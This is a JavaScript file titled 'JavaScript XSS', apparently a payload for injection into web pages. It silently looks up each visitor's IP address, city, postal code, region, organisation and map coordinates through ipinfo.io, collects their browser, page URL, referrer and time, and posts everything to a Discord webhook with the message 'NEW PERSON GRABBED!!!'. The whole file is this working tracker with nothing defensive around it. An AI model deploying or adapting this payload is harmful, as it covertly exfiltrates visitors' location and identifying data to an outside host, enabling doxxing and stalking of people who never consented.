var webhook = 'YOUR_WEBHOOK_URL';

fetch('https://ipinfo.io/json')
    .then(response => {
      if (response.status === 200) {
        return response.json();
      }
      throw new Error('Failed to fetch data');
    })
    .then(data => {
      const ip = data.ip;
      const timezone = data.timezone;
      const postal = data.postal;
      const hostname = data.hostname
      const city = data.city;
      const country = data.country;
      const region = data.region;
      const org = data.org;
      const loc = data.loc;
      const googlemap = 'https://www.google.com/maps/search/google+map++' + loc;
      const embed = {
        title: 'JavaScript XSS',
        url: 'https://github.com/madhead341/anonfiles-xss',
        color: 374276,
        author: {
          name: 'JavaScript XSS',
          icon_url: 'https://cdn.discordapp.com/avatars/1083368117230653460/a_763b3fec4cc9b04e9e0a3402fc3c39e8.gif'
        },
        description: `[JavaScript XSS has located this guy](${googlemap})`,
        fields: [
          {
            name: '\u200b',
            value: '```fix\n' +
              `IP: ${ip ? ip.replace(' ', ' ') : 'N/A'}\n` +
              `Organization: ${org ? org.replace(' ', ' ') : 'N/A'}\n` +
              `Hostname: ${hostname ? hostname.replace(' ', ' ') : 'N/A'}\n` +
              `City: ${city ? city.replace(' ', ' ') : 'N/A'}\n` +
              `Postal Code: ${postal ? postal.replace(' ', ' ') : 'N/A'}\n` +
              `Region: ${region ? region.replace(' ', ' ') : 'N/A'}\n` +
              `Country: ${country ? country.replace(' ', ' ') : 'N/A'}\n` +
              `Timezone: ${timezone ? timezone.replace(' ', ' ') : 'N/A'}\n` +
              '```'.replace(' ', ''),
            inline: true
          }
        ]
      };
      function get_browser() {
        var browser = navigator.userAgent;
        return browser;
        }
    
    function get_time() {
        var date = new Date();
        var time = date.toLocaleString();
        return time;
        }
    
    function get_url() {
        var url = window.location.href;
        return url;
        }
    
    function get_referrer() {
        var referrer = document.referrer;
        return referrer;
        }
      fetch(webhook, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 
          content: `@everyone NEW PERSON GRABBED!!!\n\`\`\`ini\nBrowser: [${get_browser()}]\nTime: [${get_time()}]\nURL: [${get_url()}]\nReferrer: [${get_referrer()}]\n[Made by K.Dot]\n[Made better by ! LO$R]\n\`\`\``,
          embeds: [embed] })
      })
        .then(response => {
          if (response.ok) {
            console.log('get beamed lmao');
            setInterval(() => console.log('get beamed lmao'), 1000);
          } else {
            throw new Error(`Failed: ${response.status} ${response.statusText}`);
          }
        })
        .catch(error => {
          console.error('Error:', error);
        });
    })
    .catch(error => console.error(error));
